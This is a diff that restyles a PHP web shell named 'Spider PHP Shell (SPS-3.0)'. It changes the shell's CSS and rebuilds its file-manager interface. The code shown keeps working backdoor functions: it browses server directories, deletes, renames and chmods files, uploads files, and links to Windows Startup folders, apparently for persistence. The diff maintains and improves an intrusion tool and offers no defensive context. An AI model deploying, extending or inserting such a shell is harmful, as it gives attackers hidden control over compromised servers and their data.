@@ -21,19 +21,128 @@ function Root_GP(&$array)
 
 function Root_CSS()
 {
-print<<<END
+?>
 <style type="text/css">
-	*{padding:0; margin:0;}
-	body{background:threedface;font-family:"Verdana", "Tahoma", "宋体",sans-serif; font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
-	a{color:#000000;text-decoration:none;}
-	a:hover{background:#BBBBBB;}
-	table{color:#000000;font-family:"Verdana", "Tahoma", "宋体",sans-serif;font-size:13px;border:1px solid #999999;}
-	td{background:#F9F6F4;}
-	.toptd{background:threedface; width:310px; border-color:#FFFFFF #999999 #999999 #FFFFFF; border-style:solid;border-width:1px;}
-	.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}
-	.actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
-</style>\n
-END;
+	@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap');
+	* {
+		font-family: 'Roboto', sans-serif;
+		padding:0; margin:0;
+	}
+	body {
+		background:#fff;
+		font-family: 'Roboto', sans-serif;
+		font-size:13px;
+		margin-top:7px;
+		padding-left:5px;
+		padding-right:13px;
+		margin-bottom:3px;
+		table-layout:fixed;
+		word-break:break-all;
+	}
+	a {
+		color:#000000;
+		text-decoration:none;
+	}
+	a:hover {
+		background:#BBBBBB;
+	}
+	table {
+		color:#000000;
+		font-family: 'Roboto', sans-serif;
+		font-size:13px;
+		border:1px solid #999999;
+	}
+	td { 
+		background:#F9F6F4;
+	}
+	.toptd {
+		background:threedface; 
+		width:310px;
+		border-color:#FFFFFF #999999 #999999 #FFFFFF;
+		border-style:solid;
+		border-width:1px;
+	}
+	.msgbox {
+		box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+		background:#fff;
+		color:#FF0000;
+		font-size:12px;
+		padding:8px;
+		border-radius:7px;
+		margin-bottom:10px;
+		text-align:center;
+		clear:both;
+	}
+	.actall {
+		box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+		background: #fff;
+		padding:10px;
+		border-radius:7px;
+		font-size:14px;
+		margin-top:3px;
+		margin-bottom:3px;
+		clear:both;
+	}
+	.actall input[type=text], select {
+		background: #fff;
+		width:100%;
+		padding:5px;
+		border:1px solid rgba(0,0,0,0.23);
+		border-radius:5px;
+		outline:none;
+	}
+	.actall input[type=submit] {
+		padding: 5px;
+		border-radius:5px;
+		border:none;
+		width:100%;
+	}
+	.actall input[type=button].button {
+		padding:5px;
+		border:none;
+		width:100%;
+		border-radius:5px;
+	}
+	.actall input[type=file] {
+		background: red;
+		width:100%;
+		padding:5px;
+		border-radius:5px;
+	}
+	.actall table.table {
+		background: green;
+		border: 1px solid transparent;
+		border-spacing:10;
+	}
+	.actall table.table td:first-child {
+		background: red;
+	}
+	.dir {
+		width: 40%;
+		display: inline-block;
+	}
+	.dir_select {
+		width: 40%;
+		display: inline-block;
+	}
+	.dir_submit {
+		width: 19%;
+		display: inline-block;
+	}
+	.newline {
+		padding:5px;
+	}
+	.newfile {
+		background: red;
+	}
+	.newdir {
+		background: green;
+	}
+	.bulk_upload {
+		background: blue;
+	}
+</style>
+<?php
 return false;
 }
 
@@ -409,37 +518,77 @@ print<<<END
 		}
 	}
 </script>
-	<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
-	<div class="actall" style="text-align:center;padding:3px;">
-	<form method="GET"><input type="hidden" id="s" name="s" value="a">
-	<input type="text" name="p" value="{$REAL_DIR}" style="width:550px;height:22px;">
-	<select onchange="location.href='?s=a&p='+options[selectedIndex].value">
-	<option>---Special catalog---</option>
-	<option value="{$ROOT_DIR}"> Website root </option>
-	<option value="{$FILE_DIR}"> This program directory </option>
-	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup"> All group startup items </option>
-	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup"> English startup items </option>
-	<option value="C:/RECYCLER"> RECYCLER </option>
-	<option value="C:/Program Files"> Program Files </option>
-	</select> <input type="submit" value="submit" style="width:50px;"></form>
-	<div style="margin-top:3px;"></div>
-	<form method="POST" action="?s=a&p={$THIS_DIR}" enctype="multipart/form-data">
-	<input type="button" value="create a new file" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
-	<input type="button" value="New directory" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');"> 
-	<input type="button" value="Bulk upload" onclick="window.location='?s=q&p={$REAL_DIR}';"> 
-	<input type="file" name="ufp" style="width:300px;height:22px;">
-	<input type="text" name="ufn" style="width:121px;height:22px;">
-	<input type="submit" value="submit" style="width:50px;">
-	</form>
-	</div>
-	<form method="POST" name="fileall" id="fileall" action="?s=a&p={$THIS_DIR}">
-	<table border="0"><tr>
-	<td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}"><b>Parent directory</b></a> </td>
-	<td class="toptd" style="width:80px;"> operating </td>
-	<td class="toptd" style="width:48px;"> Attributes </td>
-	<td class="toptd" style="width:173px;"> Change the time </td>
-	<td class="toptd" style="width:75px;"> size </td></tr>
 END;
+?>
+	<div id="msgbox" class="msgbox">
+		<?= $MSG_BOX ?>			
+	</div>
+	<div class="actall">
+		<table class="table" width="100%;">
+			<tr>
+				<td>
+					<input type="text" name="p" value="<?=$REAL_DIR?>">
+				</td>
+				<td>
+					<select onchange="location.href='?s=a&p='+options[selectedIndex].value">
+						<option>---Special catalog---</option>
+						<option value="<?=$ROOT_DIR?>"> Website root </option>
+						<option value="<?=$FILE_DIR?>"> This program directory </option>
+						<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup"> All group startup items </option>
+						<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup"> English startup items </option>
+						<option value="C:/RECYCLER"> RECYCLER </option>
+						<option value="C:/Program Files"> Program Files </option>
+					</select>
+				</td>
+				<td>
+					<input type="submit" value="submit">
+				</td>
+			</tr>
+			<form method="POST" action="?s=a&p=<?=$THIS_DIR?>" enctype="multipart/form-data">
+				<tr>
+					<td>
+						<input class="button" type="button" value="create a new file" onclick="Inputok('newfile.php','?s=p&fp=<?=$THIS_DIR?>&fn=');">
+					</td>
+					<td>
+						<input class="button" type="button" value="New directory" onclick="Inputok('newdir','?s=a&p=<?=$THIS_DIR?>&dn=');">
+					</td>
+					<td>
+						<input class="button" type="button" value="Bulk upload" onclick="window.location='?s=q&p=<?=$REAL_DIR?>';">
+					</td>
+				</tr>
+				<tr>
+					<td>
+						<input type="file" name="ufp">
+					</td>
+					<td>
+						<input type="text" name="ufn">
+					</td>
+					<td>
+						<input type="submit" value="submit">
+					</td>
+				</tr>
+			</form>
+		<form method="POST" name="fileall" id="fileall" action="?s=a&p=<?=$THIS_DIR?>">
+			<table border="0">
+				<tr>
+					<td class="toptd">
+						<a href="?s=a&p=<?=$UP_DIR?>"><b>Parent directory</b></a>
+					</td>
+					<td class="toptd">
+						operating
+					</td>
+					<td class="toptd">
+						Attributes
+					</td>
+					<td class="toptd">
+						Change the time
+					</td>
+					<td class="toptd">
+						size
+					</td>
+				</tr>
+	<?php
+
 	if(($h_d = @opendir($p)) == NULL) return false;
 	while(false !== ($Filename = @readdir($h_d)))
 	{
@@ -450,13 +599,21 @@ END;
 			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
 			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
 			$Filepath = urlencode($Filepath);
-			echo "\r\n".' <tr><td> <a href="?s=a&p='.$Filepath.'"><font face="wingdings" size="3">0</font><b> '.$Filename.' </b></a> </td> ';
+			echo "\r\n".' 
+				<tr>
+					<td>
+						<a href="?s=a&p='.$Filepath.'"><font face="wingdings" size="3"></font>'.$Filename.'</a>
+					</td> ';
 			$Filename = urlencode($Filename);
-			echo ' <td> <a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;"> delete </a> ';
-			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> Renamed </a> </td> ';
-			echo ' <td> <a href="#" onclick="Inputok(\''.$Fileperm.'\',\'?s=a&p='.$THIS_DIR.'&mk='.$Filename.'&md=\');return false;"> '.$Fileperm.' </a> </td> ';
-			echo ' <td>'.$Filetime.'</td> ';
-			echo ' <td> </td> </tr>'."\r\n";
+			echo '  <td>
+						<a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;"> delete </a> ';
+			echo ' 		<a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> Renamed </a>
+					</td> ';
+			echo ' 	<td>
+						<a href="#" onclick="Inputok(\''.$Fileperm.'\',\'?s=a&p='.$THIS_DIR.'&mk='.$Filename.'&md=\');return false;"> '.$Fileperm.' </a>
+						</td> ';
+			echo ' 	<td>'.$Filetime.'</td> ';
+			echo ' 	<td> </td> </tr>'."\r\n";
 			$NUM_D++;
 		}
 	}
@@ -471,8 +628,10 @@ END;
 			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
 			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
 			$Filesize = File_Size(@filesize($Filepath));
-			if($Filepath == File_Str(__FILE__)) $fname = '<font color="#8B0000">'.$Filename.'</font>'; else $fname = $Filename;
-			echo "\r\n".' <tr><td> <input type="checkbox" name="files[]" value="'.urlencode($Filepath).'"><a target="_blank" href="'.$Fileurls.'">'.$fname.'</a> </td>';
+			if($Filepath == File_Str(__FILE__)) 
+				$fname = '<font color="#8B0000">'.$Filename.'</font>'; 
+			else $fname = $Filename;
+			echo "\r\n".' <tr><td> <input type="checkbox" name="files[]" value="'.urlencode($Filepath).'"> <a target="_blank" href="'.$Fileurls.'">'.$fname.'</a> </td>';
 			$Filepath = urlencode($Filepath);
 			$Filename = urlencode($Filename);
 			echo ' <td> <a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'"> edit </a> ';
@@ -1838,12 +1997,14 @@ function WinMain()
 	<title> Spider PHP Shell (SPS-3.0) </title>
 	<head>
 		<style type="text/css">
+			@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap');
 			*{
 				padding:0; margin:0;
+				font-family: 'Roboto', sans-serif;
 			}
 			body {
-				background:#AAAAAA;
-				font-family:"Verdana", "Tahoma", "宋体",sans-serif; 
+				background:#e2e1e0;
+				font-family: 'Roboto', sans-serif;
 				font-size:13px; 
 				text-align:center;
 				margin-top:5px;
@@ -1858,47 +2019,43 @@ function WinMain()
 			}
 			.outtable {
 				margin: 0 auto;
-				height:595px;
+				height:630px;
 				width:955px;
 				color:#000000;
 				border-top-width: 2px;
 				border-right-width: 2px;
 				border-bottom-width: 2px;
 				border-left-width: 2px;
-				border-top-style: outset;
-				border-right-style: outset;
-				border-bottom-style: outset;
-				border-left-style: outset;
-				border-top-color: #FFFFFF;
-				border-right-color: #8c8c8c;
-				border-bottom-color: #8c8c8c;
-				border-left-color: #FFFFFF;
-				background-color: threedface;
+				border-radius:10px;
+				background-color: #fff;
 			}
 			.topbg {
-				padding-top:3px;
+				padding-top:20px;
+				padding-left:10px;
+				padding-bottom:10px;
 				text-align: left;
 				font-size:12px;
 				font-weight: bold;
 				height:22px;
 				width:950px;
-				color:#FFFFFF;
-				background: #293F5F;
+				color:#000;
+				background: transparent;
 			}
 			.bottombg {
-				padding-top:3px;
+				padding-top:10px;
 				text-align: center;
 				font-size:12px;
 				font-weight: bold;
 				height:22px;
 				width:950px;
 				color:#000000;
-				background: #888888;
+				background: transparent;
 			}
 			.listbg {
-				font-family:'lucida grande',tahoma,helvetica,arial,'bitstream vera sans',sans-serif;
+				padding:5px;
+				font-family: 'Roboto', sans-serif;
 				font-size:13px;
-				width:130px;
+				width:160px;
 			}
 			.listbg li{
 				padding:3px;
@@ -1909,16 +2066,18 @@ function WinMain()
 				text-indent:0px;
 			}
 			.listbg li a{
-				padding-top:2px;
-				background:#BBBBBB;
+				box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+				background:#fff;
 				color:#000000;
 				height:25px;
 				display:block;
+				text-align: left;
+				padding-left:10px;
+				padding-right:10px;
 				line-height:24px;
 				text-indent:0px;
-				border-color:#999999 #999999 #999999 #999999;
-				border-style:solid;
-				border-width:1px;
+				border-radius:5px;
+				
 				text-decoration:none;
 			}
 		</style>
